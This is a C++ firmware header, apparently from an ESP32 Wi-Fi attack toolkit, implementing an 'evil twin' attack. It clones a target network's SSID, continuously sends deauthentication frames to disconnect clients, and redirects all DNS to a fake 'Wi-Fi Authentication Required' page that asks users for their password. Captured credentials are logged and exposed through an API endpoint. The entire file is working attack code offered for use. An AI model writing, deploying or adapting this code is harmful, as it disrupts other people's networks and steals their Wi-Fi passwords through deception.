#pragma once
#include <WiFi.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

static bool et_running = false;
static uint8_t et_bssid[6] = {0};
static uint8_t et_ch = 6;
static String et_ssid = "Free WiFi";
static String et_creds;
static DNSServer et_dns;
static TaskHandle_t et_task = nullptr;
static bool et_routes_done = false;

static const char ET_PAGE[] PROGMEM = R"HTML(<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Wi-Fi Login</title>
<style>body{font-family:system-ui;max-width:360px;margin:60px auto;padding:16px;color:#222}
h2{color:#0a6e8a}
input{display:block;width:100%;box-sizing:border-box;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:6px;font-size:16px}
button{width:100%;padding:12px;background:#0a6e8a;color:#fff;border:0;border-radius:6px;font-size:16px}</style></head>
<body><h2>Wi-Fi Authentication Required</h2>
<p>Your Wi-Fi connection expired. Please re-enter your password.</p>
<form method="post" action="/eviltwin/login">
<input name="n" placeholder="Network Name" required>
<input name="p" placeholder="Wi-Fi Password" type="password" required>
<button>Reconnect</button></form></body></html>)HTML";

static void et_deauth_run(void*) {
  uint8_t f[64];
  while (et_running) {
    if (safety_rate_ok(1)) {
      size_t n = f_deauth(f, BC, et_bssid, 7);
      esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
    }
    vTaskDelay(pdMS_TO_TICKS(50));
  }
  et_task = nullptr;
  vTaskDelete(nullptr);
}

static bool et_start(const String& q) {
  int i;
  String bs, ss, ch;
  if ((i = q.indexOf("bssid=")) >= 0) { int e = q.indexOf('&',i); bs = q.substring(i+6, e<0?q.length():e); }
  if ((i = q.indexOf("ssid="))  >= 0) { int e = q.indexOf('&',i); ss = q.substring(i+5, e<0?q.length():e); }
  if ((i = q.indexOf("ch="))    >= 0) { int e = q.indexOf('&',i); ch = q.substring(i+3, e<0?q.length():e); }
  if (bs.length() == 17)
    sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x",
      (unsigned*)&et_bssid[0],(unsigned*)&et_bssid[1],(unsigned*)&et_bssid[2],
      (unsigned*)&et_bssid[3],(unsigned*)&et_bssid[4],(unsigned*)&et_bssid[5]);
  if (ss.length()) et_ssid = ss;
  et_ch = ch.toInt(); if (!et_ch) et_ch = 6;
  WiFi.softAPdisconnect(false);
  WiFi.softAP(et_ssid.c_str(), nullptr, et_ch);
  et_dns.start(53, "*", WiFi.softAPIP());
  et_running = true; et_creds = "";
  xTaskCreate(et_deauth_run, "et_deauth", 3072, nullptr, 5, &et_task);
  return true;
}

static void et_stop() {
  et_running = false;
  et_dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAP("ESP32-DOOM", "doomdoom");
}

static void et_loop() {
  if (et_running) et_dns.processNextRequest();
}

static void et_routes() {
  extern WebServer server;
  server.on("/api/eviltwin/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("eviltwin", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/eviltwin/stop", HTTP_POST, [](){
    tool_stop("eviltwin"); server.send(200,"application/json","{\"ok\":1}");
  });
  server.on("/api/eviltwin/status", HTTP_GET, [](){
    server.send(200,"application/json",
      "{\"running\":"+String(et_running?1:0)+
      ",\"creds\":"+String(et_creds.length())+
      ",\"msg\":\""+String(et_creds.length())+" cred chars\"}");
  });
  server.on("/api/eviltwin/creds", HTTP_GET, [](){
    String j="{\"lines\":\""; j+=et_creds; j.replace("\\","\\\\"); j.replace("\"","\\\""); j.replace("\n","\\n"); j+="\"}";
    server.send(200,"application/json",j);
  });
  if (!et_routes_done) {
    server.on("/eviltwin", HTTP_GET, [](){
      extern WebServer server; server.send_P(200,"text/html",ET_PAGE);
    });
    server.on("/eviltwin/login", HTTP_POST, [](){
      extern WebServer server;
      String n = server.arg("n"), p = server.arg("p");
      et_creds += n + ":" + p + "@" + String(millis()/1000) + "\n";
      server.send(200,"text/html","<h2>Reconnecting\342\200\246</h2><p>Please wait a moment.</p>");
    });
    et_routes_done = true;
  }
}
